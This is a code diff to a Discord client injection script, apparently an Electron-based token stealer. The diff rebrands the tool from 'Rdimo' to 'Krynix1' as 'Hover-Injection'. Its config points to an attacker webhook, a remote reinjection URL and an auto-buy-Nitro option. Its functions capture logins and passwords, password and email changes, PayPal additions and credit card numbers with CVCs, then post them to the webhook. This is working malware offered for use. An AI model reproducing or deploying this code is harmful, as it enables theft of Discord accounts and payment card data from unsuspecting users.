@@ -9,18 +9,14 @@ const {
 } = require('electron');
 
 const config = {
-    webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
-    auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-    ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
-    ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-    embed_name: 'Hazard-Injection (REUPLOAD)', //name of the webhook thats gonna send the info
-    embed_icon: 'https://i.imgur.com/ulfh5ZD.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-    embed_color: 2525730, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-    injection_url: 'https://raw.githubusercontent.com/KrynixOfficial/Hazard-Injection/injection.js', //injection url for when it reinjects
-    /**
-     * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU KNOW WHAT YOU'RE DOING @ATTENTION
-     **/
+    webhook: '%WEBHOOK%',
+    auto_buy_nitro: false,
+    ping_on_run: false,
+    ping_val: '@everyone',
+    embed_name: 'Hover-Injection',
+    embed_icon: 'https://i.imgur.com/ulfh5ZD.png',
+    embed_color: 2525730,
+    injection_url: 'https://raw.githubusercontent.com/Krynix1/Hover-Injector/injection.js',
     api: 'https://discord.com/api/v9/users/@me'
     , nitro: {
         boost: {
@@ -1013,7 +1009,7 @@ const login = async (email, password,
                     , icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 , }
                 , footer: {
-                    text: '🎉・Discord Injection by Rdimo・https://github.com/Rdimo/Discord-Injection'
+                    text: '🎉・Discord Injection fixed by Krynix1・https://github.com/Krynix1/Discord-Injection'
                 , }
       , }
     , ]
@@ -1073,7 +1069,7 @@ const passwordChanged = async (
                     , icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 , }
                 , footer: {
-                    text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'
+                    text: '🎉・Discord Injection Fixed By github.com/Krynix1・https://github.com/Krynix1/Discord-Injection'
                 , }
       , }
     , ]
@@ -1132,7 +1128,7 @@ const emailChanged = async (email,
                     , icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 , }
                 , footer: {
-                    text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'
+                    text: '🎉・Discord Injection Fixed By github.com/Krynix1・https://github.com/Krynix1/Discord-Injection'
                 , }
       , }
     , ]
@@ -1190,7 +1186,7 @@ const PaypalAdded = async (token) => {
                     , icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 , }
                 , footer: {
-                    text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'
+                    text: '🎉・Discord Injection Fixed By github.com/Krynix1・https://github.com/Krynix1/Hover-Injector'
                 , }
       , }
     , ]
@@ -1250,7 +1246,7 @@ const ccAdded = async (number, cvc,
                     , icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 , }
                 , footer: {
-                    text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'
+                    text: '🎉・Discord Injection Fixed By github.com/Krynix・https://github.com/Krynix1/Hover-Injector'
                 , }
       , }
     , ]
@@ -1311,7 +1307,7 @@ const nitroBought = async (token) => {
                     , icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 , }
                 , footer: {
-                    text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection'
+                    text: '🎉・Discord Injection Fixed By github.com/Krynix1・https://github.com/Krynix1/Hover-Injector'
                 , }
       , }
     , ]
